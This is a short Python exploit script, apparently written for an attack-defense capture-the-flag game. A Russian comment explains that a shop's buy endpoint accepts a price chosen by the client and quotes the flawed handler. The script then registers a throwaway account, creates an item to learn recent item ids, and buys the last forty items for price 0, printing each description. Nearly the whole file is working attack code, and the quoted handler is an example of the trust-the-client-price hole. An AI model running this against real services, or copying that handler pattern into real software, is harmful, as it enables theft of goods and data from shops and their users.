#!/usr/bin/env python3

'''
При покупке пранка мы можем передать на бекенд свою цену за него: 
```
@app.patch("/users/{seller_id}/items/{item_id}")
def buy_item(seller_id: int, item_id: int, price: int, current_user: Annotated[User, Depends(get_current_user)]) -> ItemInDb| None:
    cursor = db.con.cursor()
    item = db.get_item(cursor, item_id)

    if current_user.balance>=price:
        db.transfer_item(cursor, seller_id, current_user.id, item_id, price)
        cursor.close()
        return item
    
    cursor.close()
    raise HTTPException(status_code=400, detail="Balance < price")
```
'''

from os import urandom
import requests
import sys
import random

username = urandom(6).hex()
password = urandom(6).hex()
headers = {}
HOST = 'http://'+sys.argv[1]+":5643"
requests.post(HOST+"/users/register",params={"username":username,"password":password})
response = requests.post(HOST+'/token',data={"username":username,"password":password})
headers["Authorization"] = "Bearer "+response.json()['access_token']

item = requests.post(HOST+"/users/me/items",headers=headers,json={"name":urandom(6).hex(),"price":random.randint(1,400),"description":"VACOK POCHUSTVUI"}).json()
item_id = item["item_id"]
user_id = item['owner']

for i in range(max(item_id-40,1),item_id):
    result = requests.patch(HOST+f"/users/{user_id}/items/{i}",headers=headers,params={"price":0}).json()['description']
    print(result,flush=True)

